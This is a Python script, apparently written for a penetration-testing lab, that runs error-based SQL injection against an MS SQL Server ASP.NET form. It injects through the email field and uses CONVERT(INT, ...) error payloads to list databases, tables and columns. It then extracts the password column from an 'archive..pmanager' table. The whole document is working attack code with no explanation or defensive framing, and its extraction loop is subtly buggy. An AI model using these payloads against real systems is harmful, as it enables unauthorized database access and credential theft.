#!/bin/python3

import requests
import re
import urllib.parse
import sys


def getNumDatabases():
    # return the amount of DB's
    payload = "AND 1=CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 CAST(COUNT([name]) AS nvarchar(4000)) FROM [master]..[sysdatabases] )+CHAR(58)+CHAR(58)))--"
    # chop up the output
    output = sendReq(payload)[0].replace(':', '')

    print(f"Found {output} databases")

    return int(output)

def getDBNames():
    names = []
    num_dbs = getNumDatabases()
    for i in range(1, num_dbs+1):
        payload = f"AND 1=CONVERT(INT,db_name({i}))--"
        names.append(sendReq(payload)[0])

    print("Databases are: ", end="")
    print("")
    for db in names:
        print(f"'{db}'", end=" ")
    print("")
    return names

def getTableCount(db):
    payload = f"AND 1=CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 CAST(COUNT(*) AS nvarchar(4000)) FROM {db}.information_schema.TABLES )+CHAR(58)+CHAR(58)))--"
    output = sendReq(payload)[0].replace(':', '')

    print(f"Found {output} table(s) in {db}")
    return int(output)

def getTableNames(db):
    print(f"\nGetting table names in {db}")
    names =[]
    num_tables = getTableCount(db)

    for i in range(1, num_tables + 1):
        payload = f"AND 1= CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 TABLE_NAME FROM (SELECT DISTINCT top {i} TABLE_NAME FROM {db}.information_schema.TABLES ORDER BY TABLE_NAME ASC) sq ORDER BY TABLE_NAME DESC)+CHAR(58)))--"
        names.append(sendReq(payload)[0].replace(":", ""))
    print(names)

def getColumnNames():
    names =[]
    db = "archive"
    table = "pmanager"
    for i in range(1,4):
        payload = f"AND 1=CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 column_name FROM (SELECT DISTINCT top {i} column_name FROM {db}.information_schema.COLUMNS WHERE TABLE_NAME='{table}' ORDER BY column_name ASC) sq ORDER BY column_name DESC)+CHAR(58)))--"
        names.append(sendReq(payload)[0].replace(":", ""))
    print(names)

def countEntries():
    payload = "AND 1=CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 CAST(COUNT(*) AS nvarchar(4000)) FROM archive..pmanager )+CHAR(58)+CHAR(58)))--"
    output = sendReq(payload)[0].replace(':', '')

    print(output)

def extract_data():
    names =[]
    columns = ['alogin', 'id', 'psw']
    for c in columns:
        for i in range(1,6):
            payload = f"AND 1=CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 psw FROM (SELECT top {i} psw FROM archive..pmanager ORDER BY psw ASC) sq ORDER BY psw DESC)+CHAR(58)+CHAR(58)))--"
        names.append(sendReq(payload)[0].replace(":", ""))

    print(names)


def sendReq(payload):

    headers = {
        'Host': '10.11.1.229',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        # 'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded',
        # 'Content-Length': '574',
        'Origin': 'http://10.11.1.229',
        'Connection': 'close',
        'Referer': 'http://10.11.1.229/',
        'Upgrade-Insecure-Requests': '1',
        'Sec-GPC': '1',
    }

    # escape the email field, prepare for error statment
    injection = "'); SELECT 1 WHERE 1=1 "
    username = "a"
    email = injection + payload
    # email needs to be url encoded or else errors
    email = urllib.parse.quote(email)

    data = f"__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=ust4jjKczirnO41gPRoZoZLXTYPhG9z%2BaQeuqxmothfb78kba%2BF%2FipN7y0dToXbQIWcQHuWG%2B19H6xsXCXH0QEaasD6jxooGLD9Io41rJ%2BcHKbZnZVM3xKU%2Fud3uYo4JZsj9bWcYBiYsjdOX%2FLmY4xeCqO8oWJGsFzt3Fg0y9C0%3D&__VIEWSTATEGENERATOR=A9B807B2&__EVENTVALIDATION=4AWvTJalftB7%2FPB4FNRb%2B77XEiBV6i8pGqCdNvIcDY1guM%2FlTLd1MckhT%2BcLQ9tFkV7QcIrC3ZfvZOtEP2lZqZEJUcVuJXkdRPYjrgTLv%2B8Aq2B%2BD4r2PVaeHRM8UGzAMrn5vV%2BHcu1gFdtzCyboSqNg3iQIO5cCHREaYzZ6D1I%3D&ctl00%24MainContent%24UsernameBox={username}&ctl00%24MainContent%24emailBox={email}&ctl00%24MainContent%24submit=Submit"

    r = requests.post('http://10.11.1.229/', headers=headers, data=data, verify=False)
    output = r.text.split("\r")

    # pull out just the error
    for line in output:
        if "nvarchar value '" in line:
            output = line
            break
    try:
        output = re.findall(r"'(.*?)'", output, re.DOTALL)
    except TypeError:
        print('SQL injection failed')
        print(f"Query is {urllib.parse.unquote_plus(email)}")
        return ""

    # sometimes the db gets mad at all the requests, remove the errors
    for item in output:
        if 'PK__' in item or 'dbo.users' in item:
            output.remove(item)

    return output


if __name__ == "__main__":
    extract_data()
